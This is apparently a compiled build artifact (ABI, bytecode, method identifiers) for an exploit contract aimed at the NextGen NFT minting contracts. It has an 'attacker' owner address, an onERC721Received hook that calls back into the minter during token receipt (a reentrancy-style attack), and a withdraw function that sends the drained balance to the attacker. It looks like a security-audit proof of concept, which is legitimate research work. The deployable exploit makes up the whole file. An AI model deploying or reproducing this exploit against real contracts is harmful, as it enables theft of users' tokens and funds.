{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract MinterContract",
          "name": "_auctionDemo",
          "type": "address"
        },
        {
          "internalType": "contract NextGenCore",
          "name": "_nextGenCore",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attacker",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "minterContract",
      "outputs": [
        {
          "internalType": "contract MinterContract",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "nextGenCore",
      "outputs": [
        {
          "internalType": "contract NextGenCore",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "",
          "type": "bytes"
        }
      ],
      "name": "onERC721Received",
      "outputs": [
        {
          "internalType": "bytes4",
          "name": "",
          "type": "bytes4"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_tokenId",
          "type": "uint256"
        }
      ],
      "name": "setTokenId",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "tokenId",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": {
    "object": "0x608060405234801561001057600080fd5b5060405161070738038061070783398101604081905261002f91610088565b600180546001600160a01b039384166001600160a01b03199182161790915560028054929093169181169190911790915560008054909116331790556100c2565b6001600160a01b038116811461008557600080fd5b50565b6000806040838503121561009b57600080fd5b82516100a681610070565b60208401519092506100b781610070565b809150509250929050565b610636806100d16000396000f3fe608060405234801561001057600080fd5b50600436106100885760003560e01c806348eb76ee1161005b57806348eb76ee146100e15780637c4e2f221461010c57806392f002331461011f578063c929ccf31461013257600080fd5b806312065fe01461008d578063150b7a02146100a257806317d70f7c146100ce5780633ccfd60b146100d7575b600080fd5b475b6040519081526020015b60405180910390f35b6100b56100b03660046103ff565b610145565b6040516001600160e01b03199091168152602001610099565b61008f60035481565b6100df6102aa565b005b6000546100f4906001600160a01b031681565b6040516001600160a01b039091168152602001610099565b6002546100f4906001600160a01b031681565b6001546100f4906001600160a01b031681565b6100df6101403660046104df565b610389565b600254604051632e48eba560e11b815260016004820152600091829182916001600160a01b031690635c91d74a9060240160c060405180830381865afa158015610193573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101b791906104f8565b50509350935050508082036101d85750630a85bd0160e11b91506102a29050565b604080516001808252818301909252600091602080830190803683370190505090506000801b8160008151811061021157610211610558565b60209081029190910101526001805460405163b047168f60e01b81526001600160a01b039091169163b047168f91670de0b6b3a764000091610262918190600090309089908390819060040161056e565b6000604051808303818588803b15801561027b57600080fd5b505af115801561028f573d6000803e3d6000fd5b50630a85bd0160e11b9750505050505050505b949350505050565b6000546001600160a01b031633146102f55760405162461bcd60e51b8152602060048201526009602482015268536f727279202d5f2d60b81b60448201526064015b60405180910390fd5b600080546040516001600160a01b039091169047908381818185875af1925050503d8060008114610342576040519150601f19603f3d011682016040523d82523d6000602084013e610347565b606091505b50509050806103865760405162461bcd60e51b815260206004820152600b60248201526a10d85b1b0819985a5b195960aa1b60448201526064016102ec565b50565b6000546001600160a01b031633146103cf5760405162461bcd60e51b8152602060048201526009602482015268536f727279202d5f2d60b81b60448201526064016102ec565b600355565b6001600160a01b038116811461038657600080fd5b634e487b7160e01b600052604160045260246000fd5b6000806000806080858703121561041557600080fd5b8435610420816103d4565b93506020850135610430816103d4565b925060408501359150606085013567ffffffffffffffff8082111561045457600080fd5b818701915087601f83011261046857600080fd5b81358181111561047a5761047a6103e9565b604051601f8201601f19908116603f011681019083821181831017156104a2576104a26103e9565b816040528281528a60208487010111156104bb57600080fd5b82602086016020830137600060208483010152809550505050505092959194509250565b6000602082840312156104f157600080fd5b5035919050565b60008060008060008060c0878903121561051157600080fd5b865161051c816103d4565b809650506020870151945060408701519350606087015192506080870151915060a087015161054a816103d4565b809150509295509295509295565b634e487b7160e01b600052603260045260246000fd5b8781526020808201889052604082018790526101006060830181905260009083018190526001600160a01b038716608084015261012060a084018190528651908401819052909161014084019187820190845b818110156105dd578251855293830193918301916001016105c1565b505050506001600160a01b039490941660c08301525060e001529594505050505056fea2646970667358221220b6b1410cf9051e12e6fad11cae6ede638605cf07d0bffb8fbd85c0347477efb064736f6c63430008130033",
    "linkReferences": {}
  },
  "methodIdentifiers": {
    "attacker()": "48eb76ee",
    "getBalance()": "12065fe0",
    "minterContract()": "92f00233",
    "nextGenCore()": "7c4e2f22",
    "onERC721Received(address,address,uint256,bytes)": "150b7a02",
    "setTokenId(uint256)": "c929ccf3",
    "tokenId()": "17d70f7c",
    "withdraw()": "3ccfd60b"
  },
  "id": 53
}